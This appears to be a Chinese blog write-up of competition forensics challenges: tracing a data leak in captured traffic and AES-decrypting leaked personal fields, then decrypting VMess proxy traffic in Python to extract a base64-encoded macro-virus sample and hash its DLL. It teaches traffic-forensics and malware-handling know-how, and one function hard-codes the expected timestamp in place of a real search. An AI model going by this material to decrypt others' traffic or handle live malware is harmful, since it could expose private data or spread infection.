<h1 id="2022首届数据安全大赛-泄露溯源定位"><a href="#2022首届数据安全大赛-泄露溯源定位" class="headerlink" title="[2022首届数据安全大赛]泄露溯源定位"></a>[2022首届数据安全大赛]泄露溯源定位</h1><img src="/2023/03/09/MISC-Write-Up-zh/image-20230808102637362.png" class="" title="image-20230808102637362">

<h2 id="泄露溯源定位-1"><a href="#泄露溯源定位-1" class="headerlink" title="泄露溯源定位.1"></a>泄露溯源定位.1</h2><p><strong>题干信息：</strong></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808103702696.png" class="" title="image-20230808103702696">

<p><strong>解题：</strong></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808103026443.png" class="" title="image-20230808103026443">

<p>这个流相对较大，再加上察觉到mysql的授权以及查看到后续存在隐私信息，所以基本定位该流为关键流。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808103352640.png" class="" title="image-20230808103352640">

<p>所以定位该用户应该为<code>dataUser3</code>。</p>
<h2 id="泄露溯源定位-2"><a href="#泄露溯源定位-2" class="headerlink" title="泄露溯源定位.2"></a>泄露溯源定位.2</h2><p><strong>题干信息：</strong></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808103812434.png" class="" title="image-20230808103812434">

<p><strong>解题：</strong></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808104114792.png" class="" title="image-20230808104114792">

<p>点进去得到网址：</p>
<p><code>https://github.com/Tristan-Hao/Green-Berry/blob/f766064e4f9c38bf4aefa06fd3d4abbda7fe4914/catalogue.py</code></p>
<p>所以提交即可。</p>
<h2 id="泄露溯源定位-3"><a href="#泄露溯源定位-3" class="headerlink" title="泄露溯源定位.3"></a>泄露溯源定位.3</h2><p><strong>题干信息：</strong></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808104441950.png" class="" title="image-20230808104441950">

<p><strong>解题：</strong></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808104724692.png" class="" title="image-20230808104724692">

<p>如果无法定位具体使用的数值是什么，那回归数据包进行查看。利用详情界面的值当作密文进行解密。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808154128946.png" class="" title="image-20230808154128946">

<p>根据密文判断采用的解密类型，发现应当是<code>AES</code>，且密钥是<code>aa01</code>。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808111111322.png" class="" title="image-20230808111111322">

<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808111237576.png" class="" title="image-20230808111237576">

<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808111333780.png" class="" title="image-20230808111333780">

<img src="/2023/03/09/MISC-Write-Up-zh/image-20230808111510335.png" class="" title="image-20230808111510335">

<p>根据解密之后得到的信息可以发现，除了<code>姓名</code>，<code>电话</code>以外，还有<code>地址</code>，<code>银行账号</code>以及<code>邮箱地址</code>也被泄露了，即<code>ADE</code>。</p>
<h1 id="qwb2022-谍影重重"><a href="#qwb2022-谍影重重" class="headerlink" title="[qwb2022]谍影重重"></a>[qwb2022]谍影重重</h1><blockquote>
<p><a href="https://blog.gztime.cc/posts/2022/fc697ca8/#%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D">强网杯 2022 Writeup | GZTime’s Blog</a></p>
<p><a href="http://www.ehangwang.cn/article/detail/post-548934.html">2022年第六届“强网杯”网络安全大赛部分writeup (ehangwang.cn)</a></p>
</blockquote>
<ul>
<li>Route.pcapng</li>
<li>config.json</li>
<li>Amazing.zip</li>
</ul>
<p><code>Amazing.zip</code>为加密压缩包，加密文件为<code>flag</code>，基本判断通过其他两个文件得到压缩包的解压密码。打开压缩包也得到了明确的提示。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423153123627.png" class="" title="image-20230423153123627">

<h2 id="vmess协议"><a href="#vmess协议" class="headerlink" title="vmess协议"></a>vmess协议</h2><blockquote>
<p>[协议细节 - VMess 协议 - 《Project V（V2RAY）文档手册》 - 书栈网 · BookStack](<a href="https://www.bookstack.cn/read/V2RAY/developer-protocols-vmess.md#VMess">https://www.bookstack.cn/read/V2RAY/developer-protocols-vmess.md#VMess</a> 协议)</p>
<p><a href="https://github.com/v2fly/v2ray-core">v2fly&#x2F;v2ray-core: A platform for building proxies to bypass network restrictions. (github.com)</a></p>
</blockquote>
<p>主要就是看手册分析协议内容，根据协议定义进行计算。</p>
<p><strong>时刻注意调用函数的格式，是字符串还是字节！本题基本都是字节。</strong></p>
<h3 id="协议初始定义"><a href="#协议初始定义" class="headerlink" title="协议初始定义"></a>协议初始定义</h3><img src="/2023/03/09/MISC-Write-Up-zh/image-20230423163404592.png" class="" title="image-20230423163404592">

<h3 id="计算cmd-key以及cmd-iv"><a href="#计算cmd-key以及cmd-iv" class="headerlink" title="计算cmd_key以及cmd_iv"></a>计算cmd_key以及cmd_iv</h3><p>根据协议，先把指令部分求解出来。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423154043446.png" class="" title="image-20230423154043446">

<p>我们的用户ID在<code>config.json</code>中体现。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;settings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;clients&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                    <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;b831381d-6324-4d53-ad4f-8cda48b30811&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>使用匿名函数<code>lambda</code>把一些本题的常用函数给定义一下，简化调用步骤。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">md5 = <span class="keyword">lambda</span> x: hashlib.md5(x).hexdigest()</span><br><span class="line">vmess_hmac = <span class="keyword">lambda</span> x: hmac.new(client_id, x, hashlib.md5).hexdigest()</span><br></pre></td></tr></table></figure>

<p>可以从协议定义来看，关键点在<code>M</code>之上。所以我们需要利用<code>hmac</code>值，爆破出关键的时间点<code>M</code>。</p>
<p><em>但这一步莫名其妙一直没成功，无法爆出需要的时间，所以还有待改进中。不是python版本问题。</em></p>
<p>根据协议提示，写获取<code>M</code>的函数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 理论上</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cmd_iv</span>(<span class="params">time, target_hash</span>):</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(time - <span class="number">50</span>, time + <span class="number">50</span>):</span><br><span class="line">        cur_hash = vmess_hmac(p64(t))</span><br><span class="line">        <span class="keyword">if</span> cur_hash == target_hash:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;time    = <span class="subst">&#123;t&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> md5(p64(t, endian=<span class="string">&#x27;big&#x27;</span>) * <span class="number">4</span>)</span><br><span class="line"><span class="comment"># 硬凑版</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cmd_iv</span>(<span class="params">time, target_hash</span>):</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(time - <span class="number">50</span>, time + <span class="number">50</span>):</span><br><span class="line">        cur_hash = vmess_hmac(p64(t))</span><br><span class="line">        <span class="comment"># print(t)</span></span><br><span class="line">        <span class="comment"># print(cur_hash)</span></span><br><span class="line">        <span class="keyword">if</span> t == <span class="number">1615528982</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;time     = <span class="subst">&#123;t&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> md5(p64(t, endian=<span class="string">&#x27;big&#x27;</span>) * <span class="number">4</span>)</span><br></pre></td></tr></table></figure>

<p><em>p64()在pwntools库中，需要进行安装。</em></p>
<p><strong>前置条件，需要找到进行响应的数据包</strong>基本条件：时间较早；数据量较大；存在数据。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423155136573.png" class="" title="image-20230423155136573">

<p>大概的时间范围，以该流量包中的时间进行时间戳的转换。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423155417341.png" class="" title="image-20230423155417341">

<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423155718632.png" class="" title="image-20230423155718632">

<p>找到参照时间戳为<code>1615528962</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">client_id = uuid.UUID(<span class="string">&#x27;b831381d-6324-4d53-ad4f-8cda48b30811&#x27;</span>).<span class="built_in">bytes</span></span><br><span class="line"></span><br><span class="line">md5 = <span class="keyword">lambda</span> x: hashlib.md5(x).hexdigest()</span><br><span class="line">vmess_hmac = <span class="keyword">lambda</span> x: hmac.new(client_id, x, hashlib.md5).hexdigest()</span><br><span class="line"></span><br><span class="line">req = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;4dd11f9b04f2b562b9db539d939f1d52&#x27;</span> + <span class="string">&#x27;b48b35bf592c09b21545392f73f6cef91143786464578c1c361aa72f638cd0135f25343555f509aef6c74cd2a2b86ee0a9eb3b93a81a541def4763cc54f91ba02681add1b815e8c50e028c76bde0ee8a9593db88d901066305a51a9586a9e377ee100e7d4d33fcfc0453c86b1998a95275cd9368a68820c2a6a540b6386c146ea7579cfe87b2e459856772efdcf0e4c6ab0f11d018a15561cf409cbc00491d7f4d22b7c486a76a5f2f25fbef503551a0aeb90ad9dd246a9cc5e0d0c0b751eb7b54b0abbfef198b1c4e5e755077469c318f20f3e418af03540811ab5c1ea780c886ea2c903b458a26&#x27;</span>)</span><br><span class="line"><span class="comment"># print(req)</span></span><br><span class="line">cut_time = <span class="number">1615528962</span></span><br><span class="line">target_hash = req[:<span class="number">16</span>].<span class="built_in">hex</span>()</span><br><span class="line"><span class="comment"># print(target_hash)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cmd_iv</span>(<span class="params">time, target_hash</span>):</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(time - <span class="number">50</span>, time + <span class="number">50</span>):</span><br><span class="line">        cur_hash = vmess_hmac(p64(t))</span><br><span class="line">        <span class="comment"># print(t)</span></span><br><span class="line">        <span class="comment"># print(cur_hash)</span></span><br><span class="line">        <span class="keyword">if</span> t == <span class="number">1615528982</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;time     = <span class="subst">&#123;t&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> md5(p64(t, endian=<span class="string">&#x27;big&#x27;</span>) * <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">cmd_key = md5(client_id + <span class="string">b&#x27;c48619fe-8f02-49e0-b9e9-edf763e17e21&#x27;</span>)</span><br><span class="line">cmd_iv = get_cmd_iv(cut_time, target_hash)</span><br><span class="line"><span class="comment"># print(type(cmd_iv))</span></span><br><span class="line"><span class="comment"># print(type(cmd_key))</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;cmd_key  = <span class="subst">&#123;cmd_key&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;cmd_iv   = <span class="subst">&#123;cmd_iv&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># time     = 1615528982</span></span><br><span class="line"><span class="comment"># cmd_key  = &quot;b50d916ac0cec067981af8e5f38a758f&quot;</span></span><br><span class="line"><span class="comment"># cmd_iv   = &quot;881eb47d4d3b67b24328c5178c0eedcc&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="对指令部分进行解密"><a href="#对指令部分进行解密" class="headerlink" title="对指令部分进行解密"></a>对指令部分进行解密</h3><img src="/2023/03/09/MISC-Write-Up-zh/image-20230423160041040.png" class="" title="image-20230423160041040">

<p>根据协议手册，我们了解指令部分各字节的所属以及作用。需要注意的是，我们在此解密的数据是指令数据。</p>
<p>同样的，先利用匿名函数定义所要使用的<code>AES-128-CFB</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cmd_aes = <span class="keyword">lambda</span>: AES.new(<span class="built_in">bytes</span>.fromhex(cmd_key), AES.MODE_CFB, <span class="built_in">bytes</span>.fromhex(cmd_iv), segment_size=<span class="number">128</span>)</span><br></pre></td></tr></table></figure>

<p><em><strong>这边得高亮一下，python3中对称密码的使用非常麻烦，因为主要处理的数据都是字节形式，此处注意，不能直接使用b’’来进行转换，会导致长度错误，必须使用<code>bytes.fromhex()</code>进行转换。</strong></em></p>
<p><em>AES-128的密钥长度必须为16字节，而b’’转换成字节是32字节，所以会导致报错。</em></p>
<p>校验<code>F</code>部分，使用<code>FNV1a hash</code>。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423161516817.png" class="" title="image-20230423161516817">

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> fnvhash <span class="keyword">import</span> fnv1a_32</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">cmd_aes = <span class="keyword">lambda</span>: AES.new(<span class="built_in">bytes</span>.fromhex(cmd_key), AES.MODE_CFB, <span class="built_in">bytes</span>.fromhex(cmd_iv), segment_size=<span class="number">128</span>)</span><br><span class="line"></span><br><span class="line">cmd = req[<span class="number">16</span>:]</span><br><span class="line">ret = cmd_aes().decrypt(cmd)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;ver      = <span class="subst">&#123;ret[<span class="number">0</span>:<span class="number">1</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;dat_iv   = <span class="subst">&#123;ret[<span class="number">1</span>:<span class="number">17</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;dat_key  = <span class="subst">&#123;ret[<span class="number">17</span>:<span class="number">33</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;v        = <span class="subst">&#123;ret[<span class="number">33</span>:<span class="number">34</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;opt      = <span class="subst">&#123;ret[<span class="number">34</span>]:b&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p        = <span class="subst">&#123;ret[<span class="number">35</span>:<span class="number">36</span>].<span class="built_in">hex</span>()[<span class="number">0</span>]&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;sec      = <span class="subst">&#123;ret[<span class="number">35</span>:<span class="number">36</span>].<span class="built_in">hex</span>()[<span class="number">1</span>]&#125;</span>&quot;</span>)</span><br><span class="line">p = <span class="built_in">int</span>(ret[<span class="number">35</span>:<span class="number">36</span>].<span class="built_in">hex</span>()[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;cmd      = <span class="subst">&#123;ret[<span class="number">37</span>:<span class="number">38</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;port     = <span class="subst">&#123;bytes_to_long(ret[<span class="number">38</span>:<span class="number">40</span>])&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;type     = <span class="subst">&#123;ret[<span class="number">40</span>:<span class="number">41</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>) <span class="comment">#ipv4</span></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;host     = <span class="subst">&#123;<span class="string">&#x27;.&#x27;</span>.join(<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> ret[<span class="number">41</span>:<span class="number">45</span>])&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;rand     = <span class="subst">&#123;ret[<span class="number">45</span>:<span class="number">45</span> + p].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;F        = 0x<span class="subst">&#123;ret[<span class="number">45</span> + p:<span class="number">45</span> + p + <span class="number">4</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;check    = <span class="subst">&#123;<span class="built_in">hex</span>(fnv1a_32(ret[:<span class="number">45</span> + p]))&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>输出得到：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">ver      = 01</span><br><span class="line">dat_iv   = 13277f5732da52ada790d87b8829daa9</span><br><span class="line">dat_key  = 5e4a9aa9ba58c7e3ad36fe2499dca259</span><br><span class="line">v        = a2</span><br><span class="line">opt      = 1101</span><br><span class="line">p        = 6</span><br><span class="line">sec      = 3</span><br><span class="line"></span><br><span class="line">cmd      = 01</span><br><span class="line">port     = 5000</span><br><span class="line">type     = 01</span><br><span class="line"></span><br><span class="line">host     = 127.0.0.1</span><br><span class="line">rand     = 1ace7d9bb0b5</span><br><span class="line">F        = 0x39182c03</span><br><span class="line">check    = 0x39182c03</span><br></pre></td></tr></table></figure>

<h3 id="根据协议协定信息进行解密"><a href="#根据协议协定信息进行解密" class="headerlink" title="根据协议协定信息进行解密"></a>根据协议协定信息进行解密</h3><p>切分后得到的协议信息，比较关键的部分主要在<code>dat_iv</code>、<code>dat_key</code>、<code>opt</code>以及<code>sec</code>中。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423161747894.png" class="" title="image-20230423161747894">

<p>但通过文档发现<code>Opt</code>略显不对，主要因为文档年久失修:)</p>
<blockquote>
<p><a href="https://github.com/v2ray/v2ray-core/blob/5dffca84234a74da9e8174f1e0b0af3dfb2a58ce/common/protocol/headers.go">v2ray-core&#x2F;headers.go at 5dffca84234a74da9e8174f1e0b0af3dfb2a58ce · v2ray&#x2F;v2ray-core (github.com)</a></p>
</blockquote>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423162307956.png" class="" title="image-20230423162307956">

<p>所以<code>Opt</code>部分，主要开启了<code>GlobalPadding</code>、<code>ChunkMasking</code>以及<code>ChunkStream</code>，所以我们得到信息，元数据开启了数据混淆，所以我们客户端和服务端分别需要构造两个<code>Shake</code>实例。并且解密的时候注意<code>Padding</code>。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423163010237.png" class="" title="image-20230423163010237">

<p>而<code>sec</code>部分，也不出意外的年久失修了:)</p>
<blockquote>
<p><a href="https://github.com/v2ray/v2ray-core/blob/5dffca84234a74da9e8174f1e0b0af3dfb2a58ce/common/protocol/headers.proto">https://github.com/v2ray/v2ray-core/blob/5dffca84234a74da9e8174f1e0b0af3dfb2a58ce/common/protocol/headers.proto</a></p>
</blockquote>
<p><code>sec=3</code>的情况下，我们应该选择<code>AES-128-GCM</code>进行解密。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230421135041930.png" class="" title="image-20230421135041930">

<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423163043222.png" class="" title="image-20230423163043222">

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHAKE128</span><br><span class="line"><span class="comment"># 协议初始定义中体现</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SizeParser</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, nonce</span>):</span><br><span class="line">        self.shake = SHAKE128.new(nonce)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> bytes_to_long(self.shake.read(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">self, size</span>):</span><br><span class="line">        <span class="keyword">return</span> self.<span class="built_in">next</span>() ^ size</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dec</span>(<span class="params">self, size</span>):</span><br><span class="line">        <span class="keyword">return</span> self.<span class="built_in">next</span>() ^ size</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next_padding</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.<span class="built_in">next</span>() % <span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------------------------------------------------&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">arr, key, iv</span>):</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    parser = SizeParser(iv)</span><br><span class="line">    output = []</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;dat_iv   = <span class="subst">&#123;key.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;dat_key  = <span class="subst">&#123;iv.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(arr) &gt; <span class="number">0</span>:</span><br><span class="line">        padding = parser.next_padding()</span><br><span class="line">        L = parser.dec(bytes_to_long(arr[:<span class="number">2</span>])) - padding</span><br><span class="line"></span><br><span class="line">        arr = arr[<span class="number">2</span>:]</span><br><span class="line">        e_iv = p64(count, endian=<span class="string">&#x27;big&#x27;</span>)[<span class="number">6</span>:] + iv[<span class="number">2</span>:<span class="number">12</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            dec = AES.new(key, AES.MODE_GCM, e_iv).decrypt_and_verify(arr[:L-<span class="number">16</span>], arr[L-<span class="number">16</span>:L])</span><br><span class="line">            output.append(dec)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[!] Decryption failed!&#x27;</span>)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            arr = arr[L + padding:]</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line">data = cmd[<span class="number">45</span> + p + <span class="number">4</span>:]</span><br><span class="line">data_iv = ret[<span class="number">1</span>:<span class="number">17</span>]</span><br><span class="line">data_key = ret[<span class="number">17</span>:<span class="number">33</span>]</span><br><span class="line"><span class="comment"># print(type(data_key))</span></span><br><span class="line">pprint(decrypt(data, data_key, data_iv)[<span class="number">0</span>].decode().split(<span class="string">&#x27;\r\n&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>得到输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dat_iv   = 5e4a9aa9ba58c7e3ad36fe2499dca259</span><br><span class="line">dat_key  = 13277f5732da52ada790d87b8829daa9</span><br><span class="line">[&#x27;GET /out HTTP/1.1&#x27;,</span><br><span class="line"> &#x27;Host: 127.0.0.1:5000&#x27;,</span><br><span class="line"> &#x27;User-Agent: curl/7.75.0&#x27;,</span><br><span class="line"> &#x27;Accept: */*&#x27;,</span><br><span class="line"> &#x27;Connection: close&#x27;,</span><br><span class="line"> &#x27;&#x27;,</span><br><span class="line"> &#x27;&#x27;]</span><br></pre></td></tr></table></figure>

<h3 id="将所有响应数据进行解密"><a href="#将所有响应数据进行解密" class="headerlink" title="将所有响应数据进行解密"></a>将所有响应数据进行解密</h3><p><strong>插播，前面都是请求数据，本部分为响应数据。</strong></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423163848309.png" class="" title="image-20230423163848309">

<p>响应数据依旧使用<code>AES-128-CFB</code>进行解密。</p>
<p>响应数据我们如何得到？直接利用<code>Wireshark</code>追踪数据流功能进行查看。先转换成原始数据，再把所有蓝色数据导出即可。保存为<code>res.bytes</code>。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423164122895.png" class="" title="image-20230423164122895">

<p>依旧根据协议定义对解密后的数据进行切分提取。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">res = <span class="built_in">open</span>(<span class="string">&#x27;res.bytes&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"><span class="comment"># print(res)</span></span><br><span class="line">res_key = md5(data_key)</span><br><span class="line">res_iv = md5(data_iv)</span><br><span class="line"><span class="comment"># print(res_key)</span></span><br><span class="line"><span class="comment"># print(res_iv)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;res_key  = <span class="subst">&#123;res_key&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;res_iv   = <span class="subst">&#123;res_iv&#125;</span>&quot;</span>)</span><br><span class="line">res_aes = <span class="keyword">lambda</span>: AES.new(<span class="built_in">bytes</span>.fromhex(res_key), AES.MODE_CFB, <span class="built_in">bytes</span>.fromhex(res_iv), segment_size=<span class="number">128</span>)</span><br><span class="line">dec_res = res_aes().decrypt(res[:<span class="number">16</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;v        = <span class="subst">&#123;dec_res[<span class="number">0</span>:<span class="number">1</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;opt      = <span class="subst">&#123;dec_res[<span class="number">1</span>:<span class="number">2</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;cmd      = <span class="subst">&#123;dec_res[<span class="number">2</span>:<span class="number">3</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c_l      = <span class="subst">&#123;dec_res[<span class="number">3</span>:<span class="number">4</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">cmd_len = <span class="built_in">int</span>(dec_res[<span class="number">3</span>:<span class="number">4</span>].<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;cmd      = <span class="subst">&#123;dec_res[<span class="number">4</span>:<span class="number">4</span>+cmd_len].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">data = res[<span class="number">4</span> + cmd_len:]</span><br><span class="line">plaintext = decrypt(data, <span class="built_in">bytes</span>.fromhex(res_key), <span class="built_in">bytes</span>.fromhex(res_iv))</span><br></pre></td></tr></table></figure>

<p>输出得到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">res_key  = b22984cda4143a919b5b6de8121b6159</span><br><span class="line">res_iv   = fa2a8ab0fadb4854943df690335a99b5</span><br><span class="line">v        = a2</span><br><span class="line">opt      = 00</span><br><span class="line">cmd      = 00</span><br><span class="line">c_l      = 00</span><br><span class="line">cmd      = </span><br><span class="line">dat_iv   = b22984cda4143a919b5b6de8121b6159</span><br><span class="line">dat_key  = fa2a8ab0fadb4854943df690335a99b5</span><br></pre></td></tr></table></figure>

<h3 id="解密之后所得文件"><a href="#解密之后所得文件" class="headerlink" title="解密之后所得文件"></a>解密之后所得文件</h3><p>解密所得文件为一个 html 文件，其中以 base64 编码存放有一份宏病毒。因此这里取出其内容，实测电脑中的杀毒软件对此病毒十分敏感，一旦落入文件系统文件立刻会被损坏，最后为了查看内容直接存储为 zip 文件解压后查看。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line">data = <span class="string">&#x27;&#x27;</span>.join(i.decode() <span class="keyword">for</span> i <span class="keyword">in</span> plaintext)</span><br><span class="line">start = data.find(<span class="string">&quot;atob(&#x27;&quot;</span>) + <span class="built_in">len</span>(<span class="string">&quot;atob(&#x27;&quot;</span>)</span><br><span class="line">end = data.find(<span class="string">&quot;&#x27;);&quot;</span>, start)</span><br><span class="line"></span><br><span class="line">binary = b64decode(data[start:end])</span><br><span class="line">check_sum = hashlib.sha256(binary).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;doc.zip&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>).write(binary)</span><br></pre></td></tr></table></figure>

<p><em>这一步，如此如此这般这般就得到html文件，并且为宏病毒文件。暂且缘由不太理解，先放着。</em></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230421105016271.png" class="" title="image-20230421105016271">

<h3 id="利用病毒sha256值反向查找"><a href="#利用病毒sha256值反向查找" class="headerlink" title="利用病毒sha256值反向查找"></a>利用病毒sha256值反向查找</h3><p>把zip文件直接放<code>foremost</code>分析一下，能够得到病毒的dll。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sha256sum 00000277.dll</span><br><span class="line">0d7aa23a72d22dcf47f8723c58d101b3b113cbc79dd407a6fac0e65d67076ea1  00000277.dll</span><br></pre></td></tr></table></figure>

